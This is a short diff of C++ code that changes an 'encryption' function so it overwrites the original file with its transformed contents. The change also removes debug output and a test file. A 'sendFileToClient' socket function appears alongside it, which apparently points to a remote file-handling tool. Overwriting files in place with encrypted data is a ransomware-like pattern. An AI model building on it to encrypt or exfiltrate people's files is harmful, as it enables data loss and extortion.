@@ -276,8 +276,6 @@ void sendFileToClient(string path, SOCKET sock, fd_set& master) {
 
 void encryption(string path) {
 
-	cout << "salut" << endl;
-
 	char buf[4096];
 	ZeroMemory(buf, 4096);
 
@@ -289,9 +287,7 @@ void encryption(string path) {
 
 	fstream fileToEncrypt(path, ios::in | ios::out);
 	
-	ofstream of("test.txt", ios::in | ios::out);
-
-	of.clear();
+	ofstream of(path, ios::in | ios::out);
 
 	if (fileToEncrypt.is_open()) {
 
@@ -304,17 +300,15 @@ void encryption(string path) {
 				t.append(tt);
 			}
 			t.append("\n");
-			of.write(t.c_str(), t.size());
+			file += t;
 			t.clear();
 		}
+
+		fileToEncrypt.clear();
 		fileToEncrypt.close();
+
+		of.write(file.c_str(), file.size());
 		of.close();
-
-
-		/*
-		if (of.is_open()) {
-			cout << "salut2" << endl;
-			of.write(file.c_str(), file.size());
-		}*/
 	}
 }
+
